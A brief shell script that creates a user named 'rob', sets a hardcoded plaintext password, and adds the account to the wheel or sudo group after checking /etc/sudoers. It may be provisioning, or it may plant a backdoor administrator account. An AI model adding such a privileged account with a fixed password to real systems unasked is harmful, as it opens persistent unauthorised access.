useradd rob
echo -e "RobertWasHere23" | passwd rob


if [[ $(cat /etc/sudoers | grep wheel) ]]; then
    usermod -aG wheel rob
else
    usermod -aG sudo rob
fi

